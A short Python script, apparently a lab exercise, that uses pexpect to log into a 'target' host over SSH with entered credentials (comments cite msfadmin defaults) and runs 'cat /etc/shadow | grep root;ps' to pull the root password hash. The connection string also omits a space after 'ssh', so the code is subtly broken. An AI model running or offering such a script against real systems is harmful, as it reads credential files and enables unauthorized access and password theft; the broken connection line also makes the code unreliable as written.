# from cmd import PROMPT
import pexpect #library to access ssh login
PROMPT = ['#', '>>>', '>', '\$']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    connStr = 'ssh' + user + '@' +host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: ' ])
    if ret == 0:
        print("[-] Error connecting")
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print("[-] Error Connecting")
            return
        
    child.sendline(password)
    child.expect(PROMPT)
    return child #child means our SSH connection


def main():
    host = input("Enter the host to target: ")
    user = input("Enter SSH username: ") # msfadmin
    password = input("Enter SSH password: ") #msfadmin
    child = connect(user,host,password)
    send_command(child, 'cat /etc/shadow | grep root;ps ') #it'll give us the line that contains password of root and process running on system
    #enter the commands that you want to run in the target

main()